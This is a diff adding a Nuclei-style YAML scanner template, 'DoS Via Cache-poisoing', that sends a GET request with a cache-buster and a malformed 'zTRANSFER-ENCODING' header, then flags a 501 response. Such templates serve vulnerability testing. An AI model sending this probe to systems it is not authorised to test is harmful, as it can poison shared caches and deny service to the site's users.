@@ -1,0 +1,23 @@
+id: DOS-VIA-Cache-poisoing
+
+info:
+  name: DoS Via Cache-poisoing
+  author: abdulrahman
+  severity: high
+
+requests:
+  - raw:
+    - |
+      GET /?cache=1 HTTP/1.1
+      Host: {{Hostname}}
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+      Connection: close
+      zTRANSFER-ENCODING: asdf
+
+    matchers:
+      - type: status
+        status:
+          - 501
+
